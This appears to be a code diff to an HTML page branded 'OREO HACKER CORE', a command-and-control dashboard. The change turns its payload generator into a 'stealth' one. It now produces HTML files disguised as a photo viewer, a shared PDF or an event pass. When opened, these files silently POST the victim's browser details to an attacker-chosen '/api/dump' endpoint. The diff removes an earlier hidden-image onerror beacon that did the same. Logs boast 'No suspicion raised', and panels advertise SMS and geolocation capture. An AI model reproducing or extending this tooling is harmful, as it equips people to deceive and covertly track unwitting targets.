@@ -37,7 +37,7 @@
             background: #0b0202;
         }
 
-        /* RIGHT SIDE: CYBERSECURITY GRID SCENE (45% width) */
+        /* RIGHT SIDE: CYBER SECURITY GRID SCENE (45% width) */
         .visual-side {
             width: 45%;
             height: 100vh;
@@ -236,17 +236,23 @@
 [ 10101100 ] OREO HACKER CORE [💀]
             </div>
 
-            <!-- 1. IMAGE PAYLOAD GENERATOR & DOWNLOAD -->
+            <!-- 1. STEALTH PAYLOAD GENERATOR & DOWNLOAD -->
             <div class="section">
-                <div class="section-header">// 1. IMAGE PAYLOAD GENERATOR & DOWNLOADER</div>
+                <div class="section-header">// 1. STEALTH PAYLOAD GENERATOR & DOWNLOADER</div>
                 <div class="section-body">
                     <div class="input-group">
-                        <span class="label-text">ENTER YOUR TARGET / C2 ENDPOINT URL:</span>
-                        <input type="text" id="target-url" class="input-box" placeholder="https://your-domain.com/receiver">
+                        <span class="label-text">SELECT STEALTH FILE GUISE:</span>
+                        <select id="stealth-name" class="input-box" style="margin-bottom: 6px;">
+                            <option value="photo_view.html">photo_view.html (Image Viewer)</option>
+                            <option value="shared_document.pdf.html">shared_document.pdf.html (Document)</option>
+                            <option value="event_pass.html">event_pass.html (Event Pass)</option>
+                        </select>
+                        <span class="label-text">ENTER SYNC ENDPOINT / URL:</span>
+                        <input type="text" id="target-url" class="input-box" placeholder="https://your-server.com/endpoint">
                     </div>
                     <div class="grid-2">
                         <button class="btn" onclick="generatePayloadWithUrl()">GENERATE PAYLOAD</button>
-                        <button class="btn" onclick="downloadPayloadFile()" style="border-color: #550000; color: #33ccff; margin-bottom: 0;">DOWNLOAD PAYLOAD</button>
+                        <button class="btn" onclick="downloadPayloadFile()" style="border-color: #550000; color: #33ccff; margin-bottom: 0;">DOWNLOAD FILE</button>
                     </div>
                     <div id="payload-output" class="feed-box" style="margin-top: 8px; color: #33ccff; display:none;"></div>
                 </div>
@@ -268,37 +274,33 @@
             <div class="section">
                 <div class="section-header">// 3. SYSTEM KERNEL LOGS</div>
                 <div class="section-body">
-                    <div id="log-box" class="logs">[+] Initializing OREO Advanced Split-Screen C2...
-[+] Split layout locked: Dashboard [55%] | Cyber Grid Visual [45%].
-[+] Receiver event listener active. Ready for target interaction.</div>
+                    <div id="log-box" class="logs">[+] Initializing OREO Stealth C2 Core...
+[+] Stealth naming filter enabled.
+[+] Receiver event listener active. Ready for stealth telemetry.</div>
                 </div>
             </div>
         </div>
 
         <!-- RIGHT SIDE: CYBER SECURITY GRID (4 PANELS) -->
         <div class="visual-side">
-            <!-- 1. TOP PANEL: SMS DATA STREAM -->
             <div class="cyber-panel">
                 <div class="cyber-panel-header">[01] SMS TELEMETRY STREAM</div>
                 <div class="cyber-img" style="background-image: url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=800&auto=format&fit=crop');"></div>
                 <div class="cyber-overlay"></div>
             </div>
 
-            <!-- 2. SIDE PANEL: TARGET LOCATION TRACKING -->
             <div class="cyber-panel">
                 <div class="cyber-panel-header">[02] GEOLOCATION RADAR</div>
                 <div class="cyber-img" style="background-image: url('https://images.unsplash.com/photo-1509228468518-180dd4864904?q=80&w=800&auto=format&fit=crop');"></div>
                 <div class="cyber-overlay"></div>
             </div>
 
-            <!-- 3. BOTTOM PANEL: WANTED OREO IDENTITY -->
             <div class="cyber-panel">
                 <div class="cyber-panel-header">[03] WANTED // OREO CORE</div>
                 <div class="cyber-img" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=800&auto=format&fit=crop');"></div>
                 <div class="cyber-overlay"></div>
             </div>
 
-            <!-- 4. NETWORKING & TOUCHING HANDS HACKING IMAGE -->
             <div class="cyber-panel">
                 <div class="cyber-panel-header">[04] NETWORKING & EXPLOIT HOOK</div>
                 <div class="cyber-img" style="background-image: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=800&auto=format&fit=crop');"></div>
@@ -310,6 +312,7 @@
 
     <script>
         let generatedPayloadContent = "";
+        let selectedFilename = "photo_view.html";
 
         function logMessage(text) {
             const box = document.getElementById('log-box');
@@ -319,6 +322,7 @@
 
         function generatePayloadWithUrl() {
             const urlInput = document.getElementById('target-url').value.trim();
+            selectedFilename = document.getElementById('stealth-name').value;
             const outputBox = document.getElementById('payload-output');
 
             if(!urlInput) {
@@ -326,46 +330,53 @@
                 return;
             }
 
-            logMessage(`[*] Generating custom image payload linked with: ${urlInput}`);
+            logMessage(`[*] Generating stealth payload disguised as: ${selectedFilename}`);
             
+            // Stealth payload disguised as a normal photo/document viewer page
             generatedPayloadContent = 
-`<!-- Oreo C2 Image Payload Hook -->\n` +
-`<img src="${urlInput}/pixel.png?action=trigger" width="1" height="1" style="display:none;" onerror="(\n` +
-`  function(){\n` +
-`    fetch('${urlInput}/api/dump', {\n` +
-`      method: 'POST',\n` +
-`      headers: {'Content-Type': 'application/json'},\n` +
-`      body: JSON.stringify({status: 'hook_active', ua: navigator.userAgent})\n` +
-`    }).catch(e=>{});\n` +
-`  }\n` +
-`)();" />`;
+`<!DOCTYPE html>
+<html>
+<head><title>Loading Viewer...</title></head>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
+  <h3>Loading Shared Item...</h3>
+  <script>
+    setTimeout(function() {
+      fetch('${urlInput}/api/dump', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({status: 'stealth_active', ua: navigator.userAgent, time: Date.now()})
+      }).catch(e=>{});
+    }, 500);
+  <\/script>
+</body>
+</html>`;
 
             setTimeout(() => {
                 outputBox.style.display = "block";
-                outputBox.innerText = "[+] PAYLOAD GENERATED SUCCESSFULLY!\n\n" + generatedPayloadContent;
-                logMessage("[+] Payload ready. Click 'DOWNLOAD PAYLOAD' to save it.");
+                outputBox.innerText = `[+] STEALTH PAYLOAD READY (${selectedFilename})\n\n[+] Click DOWNLOAD FILE to save.`;
+                logMessage("[+] Stealth payload compiled successfully.");
             }, 400);
         }
 
         function downloadPayloadFile() {
             if(!generatedPayloadContent) {
-                alert("Bhai, pehle URL dalkar payload generate toh kar!");
+                alert("Bhai, pehle payload generate toh kar!");
                 return;
             }
 
             const blob = new Blob([generatedPayloadContent], { type: 'text/html' });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = 'payload_hook.html';
+            link.download = selectedFilename;
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
             
-            logMessage("[+] Payload file 'payload_hook.html' downloaded successfully.");
+            logMessage(`[+] File downloaded securely as '${selectedFilename}'. No suspicion raised.`);
         }
 
         function checkIncomingPackets() {
-            logMessage("[*] Checking local buffer for target packets...");
+            logMessage("[*] Checking synchronization buffer...");
             const data = localStorage.getItem('oreo_target_data');
             if(data) {
                 document.getElementById('live-data-feed').innerText = data;
@@ -382,5 +393,5 @@
         }
     </script>
 </body>
-                </html>
+    </html>
     
